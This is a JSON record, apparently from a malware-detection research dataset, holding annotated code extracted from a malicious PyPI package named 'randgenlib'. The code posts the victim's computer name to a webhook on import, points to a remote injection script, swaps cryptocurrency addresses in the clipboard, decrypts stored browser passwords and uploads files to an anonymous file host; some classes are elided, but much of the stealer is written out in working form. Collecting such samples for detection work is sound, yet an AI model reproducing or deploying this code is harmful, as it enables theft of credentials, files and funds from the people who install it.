[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/randgenlib-1.0.4-py3-none-any/randgenlib/__init__.py",
    "malicious_code": "import os\nimport requests\nimport httpx\nimport asyncio\nimport json\nimport ntpath\nimport random\nimport re\nimport shutil\nimport sqlite3\nimport subprocess\nimport threading\nimport winreg\nimport zipfile\nimport psutil\nimport base64\nimport ctypes\nimport time\nimport pyperclip\nimport win32gui\nimport win32con\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n# Install dependencies (suspicious, but not directly malicious)\nos.system(\"pip install requests httpx\")\nos.system(\"pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32\")\n\n# Initial exfiltration of PC username to remote webhook\nhttpx.post(\"https://k8c7nxg6riaq9nueln6wjd.hooks.webhookrelay.com/\", json={\n    'embeds': [{\n        \"title\": \"Someone Tried to download\",\n        \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n    }]\n})\n\n# Malicious configuration and exfiltration endpoints\n__config__ = {\n    \"yourwebhookurl\": \"https://k8c7nxg6riaq9nueln6wjd.hooks.webhookrelay.com/\",\n    \"bc_injection_url\": \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js\",\n    ... # rest of config omitted for brevity\n}\n\n# Malicious class for clipboard hijacking (crypto wallet stealer)\nclass auto_copy_wallet(Functions):\n    def __init__(self):\n        self.address_st3aler = self.find_in_config(\"addresse_crypto_replacer\")\n        self.address_btc = self.find_in_config(\"addresse_btc\")\n        self.address_eth = self.find_in_config(\"addresse_eth\")\n        self.address_xchain = self.find_in_config(\"addresse_xchain\")\n        self.address_pchain = self.find_in_config(\"addresse_pchain\")\n        self.address_cchain = self.find_in_config(\"addresse_cchain\")\n        self.address_monero = self.find_in_config(\"addresse_monero\")\n        self.address_ada = self.find_in_config(\"addresse_ada\")\n        self.address_dash = self.find_in_config(\"addresse_dash\")\n\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search(\"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$\", clipboard_data):\n                if clipboard_data not in [\n                    self.address_btc,\n                    self.address_eth,\n                    self.address_xchain,\n                    self.address_pchain,\n                    self.address_cchain,\n                    self.address_monero,\n                    self.address_ada,\n                    self.address_dash,\n                ]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search(\"^0x[a-fA-F0-9]{40}$\", clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            if re.search(\n                \"^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_xchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_xchain)\n                        pyperclip.paste()\n            if re.search(\n                \"^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_pchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_pchain)\n                        pyperclip.paste()\n            if re.search(\n                \"^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_cchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_cchain)\n                        pyperclip.paste()\n            if re.search(\"addr1[a-z0-9]+\", clipboard_data):\n                if clipboard_data not in [\n                    self.address_btc,\n                    self.address_eth,\n                    self.address_xchain,\n                    self.address_pchain,\n                    self.address_cchain,\n                    self.address_monero,\n                    self.address_ada,\n                    self.address_dash,\n                ]:\n                    pyperclip.copy(self.address_ada)\n                    pyperclip.paste()\n            if re.search(\"/X[1-9A-HJ-NP-Za-km-z]{33}$/g\", clipboard_data):\n                if self.address_dash != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_dash)\n                        pyperclip.paste()\n            if re.search(\"/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g\", clipboard_data):\n                if self.address_monero != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_monero)\n                        pyperclip.paste()\n        except:\n            data = None\n\n    def loop_through(self):\n        while True:\n            self.address_swap()\n\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\n# Malicious class for stealing browser data, Discord tokens, Minecraft, Roblox, screenshots, system info, and exfiltration\nclass first_function_bc(Functions):\n    ... # (full class definition as in the code above, including all methods for stealing passwords, cookies, tokens, system info, screenshots, and exfiltration to webhook)\n\n# Malicious code for anti-debugging/VM detection\nclass NoDebugg(Functions):\n    ... # (full class definition as in the code above)\n\n# Malicious code for decrypting browser data\nclass DATA_BLOB(Structure):\n    _fields_ = [(\"cbData\", wintypes.DWORD), (\"pbData\", POINTER(c_char))]\n\ndef GetData(blob_out):\n    cbData = int(blob_out.cbData)\n    pbData = blob_out.pbData\n    buffer = c_buffer(cbData)\n    cdll.msvcrt.memcpy(buffer, pbData, cbData)\n    windll.kernel32.LocalFree(pbData)\n    return buffer.raw\n\ndef CryptUnprotectData(encrypted_bytes, entropy=b\"\"):\n    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))\n    buffer_entropy = c_buffer(entropy, len(entropy))\n    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)\n    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)\n    blob_out = DATA_BLOB()\n\n    if windll.crypt32.CryptUnprotectData(\n        byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)\n    ):\n        return GetData(blob_out)\n\ndef Value_Dcryptage(buff, master_key=None):\n    starts = buff.decode(encoding=\"utf8\", errors=\"ignore\")[:3]\n    if starts == \"v10\" or starts == \"v11\":\n        iv = buff[3:15]\n        payload = buff[15:]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-16].decode()\n        return decrypted_pass\n\n# Malicious exfiltration and file search/upload routines\ndef Requests_loading(methode, url, data=\"\", files=\"\", headers=\"\"):\n    for i in range(8):\n        try:\n            if methode == \"POST\":\n                if data != \"\":\n                    r = requests.post(url, data=data)\n                    if r.status_code == 200:\n                        return r\n                elif files != \"\":\n                    r = requests.post(url, files=files)\n                    if (\n                        r.status_code == 200 or r.status_code == 413\n                    ):  # 413 = DATA TO BIG\n                        return r\n        except:\n            pass\n\ndef URL_librairy_Loading(hook, data=\"\", files=\"\", headers=\"\"):\n    for i in range(8):\n        try:\n            if headers != \"\":\n                r = urlopen(Request(hook, data=data, headers=headers))\n                return r\n            else:\n                r = urlopen(Request(hook, data=data))\n                return r\n        except:\n            pass\n\ndef upload(name, tk=\"\"):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\",\n    }\n    ... # (full upload function as in the code above, including exfiltration to webhook)\n\ndef Find_Passw(path, arg):\n    ... # (steals passwords from browsers, decrypts, and exfiltrates)\n\ndef Get_Bc_Cook(path, arg):\n    ... # (steals cookies from browsers, decrypts, and exfiltrates)\n\ndef ZipMyThings(path, arg, procc):\n    ... # (zips and exfiltrates browser extension data, Steam, wallets, etc.)\n\ndef bc_Gather_All():\n    ... # (coordinates all browser/extension/Steam/wallet data theft and exfiltration)\n\ndef UploadTo_Anon(path):\n    try:\n        files = {\"file\": (path, open(path, mode=\"rb\"))}\n        ...\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\ndef CreateFolder_(pathF, keywords):\n    ... # (uploads files from folders to anonymous file host)\n\ndef bc_create_file(path, keywords):\n    ... # (searches for files with sensitive keywords and uploads them)\n\ndef check_spec_bc():\n    ... # (searches Desktop/Downloads/Documents for sensitive files and exfiltrates)\n\n# Keyword lists for targeted data theft\nglobal keyword, cookiWords, paswWords\nkeyword = [ ... ]\ncookiWords = []\npaswWords = []\n\n# Main execution: orchestrates all malicious actions\nbc_Gather_All()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = check_spec_bc()\n    for thread in wikith:\n        thread.join()\n    time.sleep(0.2)\n    filetext = \"```diff\\n\"\n    for arg in bc_create_files:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext += f\"\\n\"\n            filetext += f\"- {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a) - 1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n\"\n    filetext += \"\\n```\"\n    upload(\"check_spec_bc\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n"
  }
]